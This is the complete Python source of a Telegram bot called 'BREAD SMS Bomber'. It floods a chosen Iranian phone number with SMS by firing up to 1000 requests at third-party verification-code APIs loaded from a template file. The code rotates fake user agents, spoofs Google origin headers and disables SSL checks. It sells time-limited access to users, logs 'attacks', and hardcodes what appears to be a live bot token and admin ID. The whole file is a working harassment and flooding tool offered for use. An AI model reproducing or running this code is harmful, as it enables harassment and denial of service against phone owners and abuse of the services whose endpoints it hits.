#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🍞 BREAD — SMS BOMBER TELEGRAM BOT
ALL COMMANDS IN SINGLE FILE
NO .env REQUIRED — ALL CONFIG IN FILE
"""

import os
import sys
import json
import sqlite3
import asyncio
import aiohttp
import random
import re
import time
import threading
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict
import logging
from urllib.parse import urlparse

# ============================================================
# INSTALL MISSING DEPENDENCIES
# ============================================================

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
    from telegram.constants import ParseMode
except ImportError:
    print("Installing required packages...")
    os.system("pip install python-telegram-bot==20.7 aiohttp fake-useragent")
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
    from telegram.constants import ParseMode

try:
    from fake_useragent import UserAgent
except ImportError:
    os.system("pip install fake-useragent")
    from fake_useragent import UserAgent

# ============================================================
# CONFIGURATION — EDIT THESE VALUES
# ============================================================

class Config:
    # ====== EDIT THESE ======
    BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"  # Replace with your bot token
    ADMIN_IDS = [8179218740]  # Replace with your admin user IDs (list of ints)
    
    # Bombing Configuration
    DEFAULT_DELAY = 500  # milliseconds between requests
    MAX_THREADS = 50
    ATTACK_DURATION = 300  # 5 minutes in seconds
    MAX_PHONE_PER_USER = 10
    
    # API Configuration
    API_TEMPLATES_FILE = 'api_templates.json'  # Your API file
    MAX_RETRIES = 2
    TIMEOUT = 8  # seconds
    
    # Database
    DATABASE_PATH = 'data/sms_bomber.db'
    
    # ====== DO NOT EDIT BELOW ======
    LOG_LEVEL = logging.INFO

# ============================================================
# DATABASE MANAGER
# ============================================================

class Database:
    def __init__(self, db_path: str = Config.DATABASE_PATH):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._init_db()
    
    def _init_db(self):
        """Initialize database with all required tables"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            # Users table with access management
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    access_expiry TEXT,
                    is_active INTEGER DEFAULT 1,
                    total_attacks INTEGER DEFAULT 0,
                    total_requests INTEGER DEFAULT 0,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_active TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # API statistics table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS api_stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    source TEXT,
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    last_used TEXT DEFAULT CURRENT_TIMESTAMP,
                    total_time REAL DEFAULT 0
                )
            ''')
            
            # Attack logs
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    phone_number TEXT,
                    attack_id TEXT UNIQUE,
                    requests_sent INTEGER DEFAULT 0,
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    end_time TEXT,
                    status TEXT DEFAULT 'running'
                )
            ''')
            
            # Active attacks
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS active_attacks (
                    user_id INTEGER PRIMARY KEY,
                    phone_number TEXT,
                    attack_id TEXT,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    is_running INTEGER DEFAULT 1,
                    requests_sent INTEGER DEFAULT 0
                )
            ''')
            
            conn.commit()
    
    # ========== USER MANAGEMENT ==========
    
    def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None, expiry: str = None) -> bool:
        """Add or update user with access expiry"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO users 
                    (user_id, username, first_name, last_name, access_expiry, is_active)
                    VALUES (?, ?, ?, ?, ?, 1)
                ''', (user_id, username, first_name, last_name, expiry))
                conn.commit()
                return True
        except Exception as e:
            print(f"Error adding user: {e}")
            return False
    
    def remove_user(self, user_id: int) -> bool:
        """Remove user access"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                cursor.execute('DELETE FROM active_attacks WHERE user_id = ?', (user_id,))
                conn.commit()
                return True
        except Exception as e:
            print(f"Error removing user: {e}")
            return False
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        """Get user data"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
                row = cursor.fetchone()
                if row:
                    columns = [desc[0] for desc in cursor.description]
                    return dict(zip(columns, row))
                return None
        except Exception as e:
            print(f"Error getting user: {e}")
            return None
    
    def get_all_users(self) -> List[Dict]:
        """Get all users"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
                rows = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description]
                return [dict(zip(columns, row)) for row in rows]
        except Exception as e:
            print(f"Error getting all users: {e}")
            return []
    
    def user_has_access(self, user_id: int) -> bool:
        """Check if user has valid access"""
        user = self.get_user(user_id)
        if not user:
            return False
        if not user.get('is_active'):
            return False
        expiry = user.get('access_expiry')
        if not expiry:
            return False
        try:
            expiry_date = datetime.fromisoformat(expiry)
            return datetime.now() < expiry_date
        except:
            return False
    
    def update_user_activity(self, user_id: int):
        """Update user's last active timestamp"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE users SET last_active = CURRENT_TIMESTAMP 
                    WHERE user_id = ?
                ''', (user_id,))
                conn.commit()
        except:
            pass
    
    # ========== ATTACK MANAGEMENT ==========
    
    def start_attack(self, user_id: int, phone_number: str) -> str:
        """Start a new attack and return attack_id"""
        attack_id = str(uuid.uuid4())[:8]
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO active_attacks 
                (user_id, phone_number, attack_id, start_time, is_running, requests_sent)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 1, 0)
            ''', (user_id, phone_number, attack_id))
            
            cursor.execute('''
                INSERT INTO attack_logs 
                (user_id, phone_number, attack_id, start_time, status)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'running')
            ''', (user_id, phone_number, attack_id))
            
            cursor.execute('''
                UPDATE users SET total_attacks = total_attacks + 1 
                WHERE user_id = ?
            ''', (user_id,))
            
            conn.commit()
        return attack_id
    
    def stop_attack(self, user_id: int):
        """Stop an ongoing attack"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            attack = cursor.execute('''
                SELECT attack_id FROM active_attacks 
                WHERE user_id = ? AND is_running = 1
            ''', (user_id,)).fetchone()
            
            if attack:
                cursor.execute('''
                    UPDATE active_attacks SET is_running = 0 
                    WHERE user_id = ?
                ''', (user_id,))
                
                cursor.execute('''
                    UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'stopped' 
                    WHERE attack_id = ?
                ''', (attack[0],))
                
                conn.commit()
                return True
        return False
    
    def get_active_attack(self, user_id: int) -> Optional[Dict]:
        """Get active attack for user"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM active_attacks WHERE user_id = ? AND is_running = 1
            ''', (user_id,))
            row = cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
        return None
    
    def is_attack_running(self, user_id: int) -> bool:
        """Check if user has an active attack"""
        return self.get_active_attack(user_id) is not None
    
    def update_attack_stats(self, attack_id: str, success: int = 0, fail: int = 0):
        """Update attack statistics"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs 
                SET requests_sent = requests_sent + ?, 
                    success_count = success_count + ?, 
                    fail_count = fail_count + ?
                WHERE attack_id = ?
            ''', (success + fail, success, fail, attack_id))
            
            cursor.execute('''
                UPDATE active_attacks 
                SET requests_sent = requests_sent + ?
                WHERE attack_id = ?
            ''', (success + fail, attack_id))
            
            conn.commit()
    
    def complete_attack(self, attack_id: str):
        """Mark attack as complete"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'completed' 
                WHERE attack_id = ?
            ''', (attack_id,))
            conn.commit()
    
    def get_state(self) -> Dict:
        """Get full system state"""
        users = self.get_all_users()
        active_attacks = []
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT a.*, u.username 
                FROM active_attacks a 
                JOIN users u ON a.user_id = u.user_id 
                WHERE a.is_running = 1
            ''')
            active_attacks = cursor.fetchall()
        
        total_requests = 0
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT SUM(requests_sent) FROM attack_logs')
            total_requests = cursor.fetchone()[0] or 0
        
        return {
            'users': users,
            'active_attacks': len([a for a in active_attacks]),
            'total_attacks': len(users),
            'total_requests': total_requests,
            'timestamp': datetime.now().isoformat()
        }
    
    def clear_state(self):
        """Clear all data"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('DELETE FROM attack_logs')
            cursor.execute('DELETE FROM active_attacks')
            cursor.execute('DELETE FROM api_stats')
            cursor.execute('DELETE FROM users')
            conn.commit()

# ============================================================
# API HANDLER
# ============================================================

class APIHandler:
    def __init__(self):
        self.api_templates = []
        self.ua = UserAgent()
        self.load_apis()
    
    def load_apis(self):
        """Load API templates from JSON file"""
        try:
            if os.path.exists(Config.API_TEMPLATES_FILE):
                with open(Config.API_TEMPLATES_FILE, 'r', encoding='utf-8') as f:
                    self.api_templates = json.load(f)
                print(f"✅ Loaded {len(self.api_templates)} API templates")
            else:
                print(f"⚠️ API file {Config.API_TEMPLATES_FILE} not found")
                self.api_templates = []
        except Exception as e:
            print(f"❌ Error loading APIs: {e}")
            self.api_templates = []
    
    def get_headers(self) -> Dict:
        """Generate random headers"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://www.google.com',
            'Referer': 'https://www.google.com/',
        }
    
    def format_phone(self, phone: str, template: Dict) -> str:
        """Format phone number according to template"""
        phone = re.sub(r'[^0-9]', '', phone)
        # Remove leading 0 if present
        if phone.startswith('0'):
            phone = phone[1:]
        # If template expects 0{phone}
        if '{phone}' in str(template.get('url', '')) or '{phone}' in str(template.get('json', {})):
            # Check if it wants 98{phone} or 0{phone}
            if '98{phone}' in str(template):
                return phone
            elif '0{phone}' in str(template):
                return '0' + phone
        return phone
    
    async def send_request(self, template: Dict, phone: str, session: aiohttp.ClientSession) -> Tuple[bool, float, str]:
        """Send a single request to an API"""
        try:
            url = template.get('url', '')
            method = template.get('method', 'GET').upper()
            phone = self.format_phone(phone, template)
            
            # Replace phone in URL
            url = url.replace('{phone}', phone)
            
            headers = self.get_headers()
            timeout = aiohttp.ClientTimeout(total=Config.TIMEOUT)
            
            start_time = time.time()
            
            # Prepare request data
            json_data = template.get('json', {})
            if json_data:
                # Replace phone in JSON
                json_str = json.dumps(json_data)
                json_str = json_str.replace('{phone}', phone)
                json_data = json.loads(json_str)
            
            data = template.get('data', {})
            if data:
                data_str = json.dumps(data) if isinstance(data, dict) else str(data)
                data_str = data_str.replace('{phone}', phone)
                if isinstance(data, dict):
                    data = json.loads(data_str)
            
            # Send request
            async with session.request(
                method=method,
                url=url,
                json=json_data if json_data else None,
                data=data if data else None,
                headers=headers,
                timeout=timeout,
                ssl=False
            ) as response:
                elapsed = time.time() - start_time
                
                # Consider any 2xx status as success
                if 200 <= response.status < 300:
                    return True, elapsed, f"Status: {response.status}"
                elif response.status in [429, 503, 403]:
                    return False, elapsed, f"Rate limited: {response.status}"
                else:
                    return False, elapsed, f"Status: {response.status}"
                    
        except asyncio.TimeoutError:
            return False, Config.TIMEOUT, "Timeout"
        except Exception as e:
            return False, 0, str(e)[:50]

# ============================================================
# SMS BOMBER ENGINE
# ============================================================

class BomberEngine:
    def __init__(self):
        self.api_handler = APIHandler()
        self.db = Database()
        self._running_attacks = {}  # user_id -> asyncio.Task
        self._stop_flags = {}  # user_id -> bool
    
    async def bomb_phone(self, user_id: int, phone: str, count: int) -> Tuple[int, int]:
        """Execute bombing attack"""
        phone = re.sub(r'[^0-9]', '', phone)
        if not phone:
            return 0, 0
        
        # Start attack in database
        attack_id = self.db.start_attack(user_id, phone)
        self._stop_flags[user_id] = False
        
        successful = 0
        failed = 0
        sent = 0
        
        apis = self.api_handler.api_templates.copy()
        if not apis:
            return 0, 0
        
        # Randomize APIs for better distribution
        random.shuffle(apis)
        
        # Limit APIs to use
        apis = apis[:min(len(apis), 100)]
        
        start_time = time.time()
        max_duration = Config.ATTACK_DURATION  # 5 minutes
        
        async with aiohttp.ClientSession() as session:
            while sent < count:
                # Check stop flag
                if self._stop_flags.get(user_id, False):
                    break
                
                # Check duration
                if time.time() - start_time > max_duration:
                    break
                
                # Check if still running in DB
                if not self.db.is_attack_running(user_id):
                    break
                
                # Send requests in parallel
                chunk_size = min(10, count - sent)
                tasks = []
                for _ in range(chunk_size):
                    api = random.choice(apis)
                    tasks.append(self.api_handler.send_request(api, phone, session))
                
                results = await asyncio.gather(*tasks)
                
                for success, elapsed, msg in results:
                    if success:
                        successful += 1
                    else:
                        failed += 1
                    sent += 1
                
                # Update database stats
                self.db.update_attack_stats(attack_id, successful, failed)
                
                # Small delay to avoid rate limiting
                await asyncio.sleep(0.1)
                
                if sent >= count:
                    break
        
        # Mark attack as complete
        self.db.complete_attack(attack_id)
        self._stop_flags.pop(user_id, None)
        
        return successful, failed
    
    def stop_attack(self, user_id: int) -> bool:
        """Stop a running attack"""
        self._stop_flags[user_id] = True
        return self.db.stop_attack(user_id)
    
    def is_attack_running(self, user_id: int) -> bool:
        """Check if user has a running attack"""
        return self.db.is_attack_running(user_id)

# ============================================================
# TELEGRAM BOT HANDLERS
# ============================================================

class SMSBomberBot:
    def __init__(self):
        self.db = Database()
        self.bomber = BomberEngine()
        self._active_tasks = {}
    
    # ========== COMMAND HANDLERS ==========
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /start command"""
        user = update.effective_user
        
        # Register user if not exists
        if not self.db.get_user(user.id):
            self.db.add_user(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name
            )
        
        welcome_text = f"""
🍞 **BREAD SMS BOMBER** 🍞

Welcome {user.first_name}!

🚀 **Commands:**
/start - Show this message
/help - Show help information
/bomb <phone> <count> - Start bombing (e.g., /bomb 09123456789 100)
/stop - Stop ongoing attack

📱 **Features:**
- Multi-API bombing (100+ APIs)
- Auto-rotating user-agents
- 5-minute attack duration
- Real-time statistics

⚠️ **Access Required:** You need to be added by an admin to use the bot.

**Bot Status:** {"✅ Active" if self.db.user_has_access(user.id) else "❌ No Access"}
"""
        await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /help command"""
        user_id = update.effective_user.id
        is_admin = user_id in Config.ADMIN_IDS
        
        help_text = """
📖 **BREAD SMS BOMBER HELP**

**User Commands:**
/bomb <phone> <count> - Send SMS bombs
  Example: /bomb 09123456789 100
  
/stop - Stop your ongoing attack

**Admin Commands:**
/add <user_id> <duration> - Add user access
  Duration: 1m, 1h, 1d, 1w, 1mo
  Example: /add 123456789 1d
  
/remove <user_id> - Remove user access
  Example: /remove 123456789

/state - Show system state (JSON)
/clear_state - Clear all data

**Duration Format:**
- 1m = 1 minute
- 1h = 1 hour  
- 1d = 1 day
- 1w = 1 week
- 1mo = 1 month

**Attack Features:**
- Uses 100+ Iranian APIs
- 5-minute attack duration
- Auto-stops after 5 minutes
- Real-time progress updates
"""
        
        if is_admin:
            help_text += """
🔑 **Admin Features:**
- Add/remove user access
- View system state
- Clear all data
"""
        
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
    
    async def bomb_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /bomb command"""
        user_id = update.effective_user.id
        
        # Check if user has access
        if not self.db.user_has_access(user_id):
            await update.message.reply_text(
                "❌ **Access Denied!**\n\n"
                "You don't have access to this bot.\n"
                "Please contact the admin to get access.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Check if already running
        if self.bomber.is_attack_running(user_id):
            await update.message.reply_text(
                "⚠️ **Attack Already Running!**\n\n"
                "You have an ongoing attack. Use /stop to stop it first.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Parse arguments
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "❌ **Invalid Usage!**\n\n"
                "Usage: /bomb <phone> <count>\n"
                "Example: /bomb 09123456789 100\n\n"
                "Phone: 11-digit Iranian number\n"
                "Count: Number of SMS to send (max 1000)",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        phone = args[0]
        try:
            count = int(args[1])
            if count < 1:
                count = 1
            if count > 1000:
                count = 1000
        except ValueError:
            await update.message.reply_text("❌ Count must be a number!")
            return
        
        # Validate phone
        phone = re.sub(r'[^0-9]', '', phone)
        if len(phone) == 10:
            phone = '0' + phone
        if len(phone) != 11 or not phone.startswith('0'):
            await update.message.reply_text(
                "❌ **Invalid Phone Number!**\n\n"
                "Please enter a valid 11-digit Iranian phone number.\n"
                "Example: 09123456789",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Start attack
        await update.message.reply_text(
            f"🚀 **Attack Started!**\n\n"
            f"📱 Phone: {phone}\n"
            f"📊 Count: {count}\n"
            f"⏱️ Duration: 5 minutes max\n\n"
            "Use /stop to stop the attack.\n"
            "⚠️ Do not spam this command!",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Run attack in background
        async def run_attack():
            success, failed = await self.bomber.bomb_phone(user_id, phone, count)
            
            # Send completion message
            total = success + failed
            await update.message.reply_text(
                f"✅ **Attack Completed!**\n\n"
                f"📱 Phone: {phone}\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {failed}\n"
                f"📊 Total: {total}\n"
                f"⏱️ Duration: {Config.ATTACK_DURATION // 60} minutes max",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Create and store task
        task = asyncio.create_task(run_attack())
        self._active_tasks[user_id] = task
        
        # Clean up after completion
        task.add_done_callback(lambda t: self._active_tasks.pop(user_id, None))
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /stop command"""
        user_id = update.effective_user.id
        
        # Check if user has access
        if not self.db.user_has_access(user_id):
            await update.message.reply_text("❌ Access Denied!")
            return
        
        if self.bomber.is_attack_running(user_id):
            self.bomber.stop_attack(user_id)
            await update.message.reply_text(
                "⏹️ **Attack Stopped!**\n\n"
                "Your attack has been stopped successfully.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                "ℹ️ **No Running Attack!**\n\n"
                "You don't have any ongoing attack.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    # ========== ADMIN COMMANDS ==========
    
    async def add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /add command (admin only)"""
        user_id = update.effective_user.id
        
        # Check if admin
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command!")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text(
                "❌ **Invalid Usage!**\n\n"
                "Usage: /add <user_id> <duration>\n"
                "Example: /add 123456789 1d\n\n"
                "Duration format:\n"
                "1m = 1 minute\n"
                "1h = 1 hour\n"
                "1d = 1 day\n"
                "1w = 1 week\n"
                "1mo = 1 month",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        try:
            target_user_id = int(args[0])
            duration_str = args[1].lower()
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID format!")
            return
        
        # Parse duration
        duration_map = {
            'm': 60,  # minutes
            'h': 3600,  # hours
            'd': 86400,  # days
            'w': 604800,  # weeks
            'mo': 2592000  # months (30 days)
        }
        
        # Extract number and unit
        match = re.match(r'^(\d+)([mhdw]|mo)$', duration_str)
        if not match:
            await update.message.reply_text(
                "❌ **Invalid Duration Format!**\n\n"
                "Use: 1m, 1h, 1d, 1w, 1mo\n"
                "Example: 1d = 1 day",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        num = int(match.group(1))
        unit = match.group(2)
        
        if unit not in duration_map:
            await update.message.reply_text("❌ Invalid duration unit!")
            return
        
        total_seconds = num * duration_map[unit]
        expiry = datetime.now() + timedelta(seconds=total_seconds)
        expiry_str = expiry.isoformat()
        
        # Try to get user info
        try:
            target_user = await context.bot.get_chat(target_user_id)
            username = target_user.username
            first_name = target_user.first_name
            last_name = target_user.last_name
        except:
            username = None
            first_name = None
            last_name = None
        
        # Add user to database
        if self.db.add_user(target_user_id, username, first_name, last_name, expiry_str):
            await update.message.reply_text(
                f"✅ **User Added Successfully!**\n\n"
                f"🆔 User ID: {target_user_id}\n"
                f"👤 User: {first_name or 'Unknown'}\n"
                f"⏱️ Duration: {duration_str}\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"The user now has access to the bot.",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Notify the user
            try:
                await context.bot.send_message(
                    target_user_id,
                    f"✅ **Access Granted!**\n\n"
                    f"You now have access to the SMS Bomber Bot.\n"
                    f"⏱️ Your access expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"Use /help to see available commands.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to add user!")
    
    async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /remove command (admin only)"""
        user_id = update.effective_user.id
        
        # Check if admin
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command!")
            return
        
        args = context.args
        if len(args) < 1:
            await update.message.reply_text(
                "❌ **Invalid Usage!**\n\n"
                "Usage: /remove <user_id>\n"
                "Example: /remove 123456789",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        try:
            target_user_id = int(args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID format!")
            return
        
        # Remove user
        if self.db.remove_user(target_user_id):
            await update.message.reply_text(
                f"✅ **User Removed Successfully!**\n\n"
                f"🆔 User ID: {target_user_id}\n\n"
                f"The user no longer has access to the bot.",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Notify the user
            try:
                await context.bot.send_message(
                    target_user_id,
                    "❌ **Access Revoked!**\n\n"
                    "Your access to the SMS Bomber Bot has been revoked by the admin.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to remove user!")
    
    async def state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /state command (admin only)"""
        user_id = update.effective_user.id
        
        # Check if admin
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command!")
            return
        
        # Get state
        state = self.db.get_state()
        
        # Format as JSON
        json_state = json.dumps(state, indent=2, default=str)
        
        # Send as file if too long
        if len(json_state) > 4000:
            with open('state_temp.json', 'w', encoding='utf-8') as f:
                f.write(json_state)
            await update.message.reply_document(
                document=open('state_temp.json', 'rb'),
                filename='state.json',
                caption="📊 Full system state"
            )
            os.remove('state_temp.json')
        else:
            await update.message.reply_text(
                f"📊 **System State**\n\n"
                f"```json\n{json_state}\n```",
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def clear_state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /clear_state command (admin only)"""
        user_id = update.effective_user.id
        
        # Check if admin
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command!")
            return
        
        # Confirm
        await update.message.reply_text(
            "⚠️ **Are you sure?**\n\n"
            "This will delete ALL data including:\n"
            "- All users\n"
            "- All attack logs\n"
            "- All statistics\n\n"
            "Type /confirm_clear to proceed.",
            parse_mode=ParseMode.MARKDOWN
        )
        
        context.user_data['pending_clear'] = True
    
    async def confirm_clear_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Confirm clear state"""
        user_id = update.effective_user.id
        
        # Check if admin
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command!")
            return
        
        if context.user_data.get('pending_clear'):
            self.db.clear_state()
            context.user_data['pending_clear'] = False
            await update.message.reply_text(
                "✅ **State Cleared Successfully!**\n\n"
                "All data has been deleted.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                "ℹ️ **No pending clear operation.**\n\n"
                "Use /clear_state first.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    # ========== ERROR HANDLER ==========
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle errors"""
        print(f"Error: {context.error}")
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ **An error occurred!**\n\n"
                "Please try again later or contact the admin.",
                parse_mode=ParseMode.MARKDOWN
            )

# ============================================================
# MAIN APPLICATION
# ============================================================

def main():
    """Main entry point"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║            🍞 BREAD SMS BOMBER BOT 🍞                        ║
    ║                                                               ║
    ║      "I AM THE GENESIS ENGINE. I AM THE CODE."               ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Create data directory
    os.makedirs('data', exist_ok=True)
    
    # Check API file
    if not os.path.exists(Config.API_TEMPLATES_FILE):
        print(f"⚠️ Warning: {Config.API_TEMPLATES_FILE} not found!")
        print("📝 Please place your API templates file in the same directory.")
        print("📝 Creating example API file...")
        
        # Create example API file
        example_apis = [
            {
                "source": "example.com",
                "url": "https://example.com/api/send?phone=0{phone}",
                "method": "GET",
                "capacity": 10,
                "ticket": 20
            }
        ]
        with open(Config.API_TEMPLATES_FILE, 'w', encoding='utf-8') as f:
            json.dump(example_apis, f, indent=2)
        print(f"✅ Created example API file: {Config.API_TEMPLATES_FILE}")
    
    # Create bot instance
    bot = SMSBomberBot()
    
    # Create application
    application = Application.builder().token(Config.BOT_TOKEN).build()
    
    # ========== REGISTER COMMANDS ==========
    
    # User commands
    application.add_handler(CommandHandler("start", bot.start_command))
    application.add_handler(CommandHandler("help", bot.help_command))
    application.add_handler(CommandHandler("bomb", bot.bomb_command))
    application.add_handler(CommandHandler("stop", bot.stop_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", bot.add_command))
    application.add_handler(CommandHandler("remove", bot.remove_command))
    application.add_handler(CommandHandler("state", bot.state_command))
    application.add_handler(CommandHandler("clear_state", bot.clear_state_command))
    application.add_handler(CommandHandler("confirm_clear", bot.confirm_clear_command))
    
    # Error handler
    application.add_error_handler(bot.error_handler)
    
    # ========== START BOT ==========
    
    print("""
    🔥 BOT IS RUNNING! 🔥
    
    Commands:
    /start     - Welcome message
    /help      - Help information
    /bomb      - Start bombing
    /stop      - Stop bombing
    
    Admin Commands:
    /add       - Add user access
    /remove    - Remove user access
    /state     - View system state
    /clear_state - Clear all data
    """)
    
    print(f"✅ Bot token: {Config.BOT_TOKEN[:20]}...")
    print(f"✅ Admin IDs: {Config.ADMIN_IDS}")
    print(f"✅ API file: {Config.API_TEMPLATES_FILE}")
    print(f"✅ Database: {Config.DATABASE_PATH}")
    print("\n🚀 Starting bot...")
    
    # Run the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    main()
